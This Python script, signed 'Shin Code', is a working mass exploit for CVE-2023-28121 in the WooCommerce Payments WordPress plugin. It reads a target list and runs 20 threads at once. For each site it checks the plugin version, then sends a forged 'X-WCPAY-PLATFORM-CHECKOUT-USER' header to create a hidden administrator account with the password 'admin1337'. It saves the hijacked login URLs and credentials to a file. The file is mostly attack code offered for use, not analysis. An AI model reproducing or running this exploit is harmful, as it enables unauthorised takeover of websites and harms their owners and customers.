import requests
import time
import re
import random
import os
import sys
import json
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, Style, init
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore', InsecureRequestWarning)
init(autoreset=True)

r = Fore.RED + Style.BRIGHT
g = Fore.GREEN + Style.BRIGHT
c = Fore.CYAN + Style.BRIGHT
y = Fore.YELLOW + Style.BRIGHT
o = Fore.RESET + Style.RESET_ALL


def RandomGenerator(length):
    return ''.join(random.sample('abcdefghijklmnopqrstuvwxyz', length))

def add_admin(url):
    RandomStringForPREFIX = str(RandomGenerator(5))
    username = RandomStringForPREFIX + str(RandomGenerator(5))
    email = RandomStringForPREFIX + '@' + url
    try:
        req = requests.get('http://' + url + '/wp-content/plugins/woocommerce-payments/readme.txt', verify=False, timeout=10)
        version_match = re.search(r"Stable tag: (.*)", req.text)
        if version_match:
            version = version_match.group(1)
            if int(version.replace('.', '')) < 562:
                print(y + 'Vuln' + ' ==> ' + url + o + g + ' Version : '+ g + version + o)
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Vivaldi/6.1.3035.111.',
            'X-WCPAY-PLATFORM-CHECKOUT-USER': '1'
        }
        data = {
            'rest_route': '/wp/v2/users',
            'username': username,
            'email': email,
            'password': 'admin1337',
            'roles': 'administrator',
        }
        with requests.Session() as s:
            huh = s.get('http://' + url, headers=headers, verify=False, timeout=10)
            response = s.post('http://' + url, data=data, headers=headers, verify=False, timeout=10)
            if response.status_code == 201:
                print(y + 'OK' + ' ==> ' + g + url + o)
                with open('results.txt', 'a') as file:
                    file.write('http://' + url + '/wp-login.php' + '|' + username + '|' + 'admin1337' + '|' + email + '\n')
            else:
                print(r +  'BAD co' + o +' '+ url)
    except (requests.exceptions.RequestException, requests.exceptions.Timeout, requests.exceptions.ConnectionError):
        print(r + 'coded by shin_code ' + url + o)
    except Exception as e:
        print(r + 'Error: ' + str(e) + o)

if __name__ == '__main__':
    os.system('cls' if os.name == 'nt' else 'clear')
    print("{} CVE-2023-28121  | {}Shin Code\n".format(y, c))
    url = raw_input('List:~# ')
    with open(url, 'r') as file:
        url_list = file.read().replace('http://', '').replace('https://', '').splitlines()
    pool = ThreadPool(20)
    pool.map(add_admin, url_list)
    pool.close()
    pool.join()
